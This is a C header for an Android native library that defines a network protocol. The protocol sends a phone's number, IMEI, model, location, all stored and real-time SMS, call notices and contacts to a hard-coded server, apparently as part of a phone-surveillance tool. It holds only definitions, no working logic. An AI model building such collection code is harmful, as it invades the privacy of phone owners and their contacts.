#ifndef _Included_com_example_myphone_common_h
#define _Included_com_example_myphone_common_h

#include <android/log.h>

#define TAG "MyPhone"
#define LOGV(...) __android_log_print(ANDROID_LOG_VERBOSE, TAG, __VA_ARGS__)
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG , TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN , TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR , TAG, __VA_ARGS__)

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>

#define SLEEPTIME	 1
#define DEBUG		 true
#define SERVER_IP    "10.0.0.120"
#define SERVER_PORT   13389
#define NULL 0
#define INVALID_SOCKET -1
#define EOK				0

//传输结构体定义
#define MSGTYPE_BASEPHONEINFO       0x1			//手机基本信息
#define MSGTYPE_GETLOCALTION        0x2			//获取手机定位信息
#define MSGTYPE_QUERYAllSMS         0x3			//请求获取手机所有SMS信息
#define MSGTYPE_AllSMSBACK          0x13		//返回手机所有SMS信息
#define MSGTYPE_SMSIN               0x4			//获取实时收到的SMS信息
#define MSGTYPE_SMSOUT              0x5			//获取实时发送的SMS信息
#define MSGTYPE_VOICESMS            0x6			//新通话消息信息
#define MSGTYPE_CONTACTSINFO        0x7			//联系人信息
#define MSGTYPE_QUERYCONTACTS		0x8			//请求发送联系人信息
#define MAXMSGLENGTH				0x10000		//存放SMS信息的最大缓冲区长度
//////////////////////////////////////////////////////////////////////////
//数据包头部,所有的数据包都以MSG_HEAD开头
//////////////////////////////////////////////////////////////////////////
typedef struct tagMSG_HEAD
{
    int dwCmdId;               //命令类型
    int dwCmdLength;           //整个包的长度
}MSG_HEAD;
//////////////////////////////////////////////////////////////////////////
//手机基本信息
//////////////////////////////////////////////////////////////////////////
typedef struct tagBasePhoneInfo
{
    char szPhoneNum[16];        //手机号码
    char szPhoneModel[32];      //手机型号
    char szSystemVersion[16];   //手机系统版本
    char szIMEI[20];            //IMEI码
} BASEPHONEINFO, *PBASEPHONEINFO;
//////////////////////////////////////////////////////////////////////////
//请求获取所有SMS信息格式
//////////////////////////////////////////////////////////////////////////
typedef struct tagQueryAllSMS
{
    long long lMinDate;            	//请求发送最小的日期
} QUERYALLSMS, *PQUERYALLSMS;
//////////////////////////////////////////////////////////////////////////
//所有SMS信息集合
//////////////////////////////////////////////////////////////////////////
typedef struct tagAllSms
{
	char szAllMsg[MAXMSGLENGTH];
} ALLSMS, *PALLSMS;
//////////////////////////////////////////////////////////////////////////
//新SMS信息集合
//////////////////////////////////////////////////////////////////////////
typedef struct tagNewSms
{
	char szMsg[MAXMSGLENGTH];
} NEWSMS, *PNEWSMS;
//////////////////////////////////////////////////////////////////////////
//新VOICE信息集合
//////////////////////////////////////////////////////////////////////////
typedef struct tagNewVoice
{
	char szMsg[MAXMSGLENGTH];
} NEWVOICE, *PNEWVOICE;
//////////////////////////////////////////////////////////////////////////
//联系人信息集合
//////////////////////////////////////////////////////////////////////////
typedef struct tagContacts
{
	char szMsg[MAXMSGLENGTH];
} CONTACTS, *PCONTACTS;
//////////////////////////////////////////////////////////////////////////
//所有的数据包完整结构
//////////////////////////////////////////////////////////////////////////
typedef struct tagMSG_STRUCT
{
    MSG_HEAD Msg_Head;
    union
    {
        BASEPHONEINFO BasePhoneInfo;
        QUERYALLSMS   QueryAllSms;
        ALLSMS		  AllSms;
        NEWSMS	      NewSms;
        NEWVOICE	  NewVoiceMsg;
        CONTACTS	  Contacts;
    };
} MSG_STRUCT;
#endif
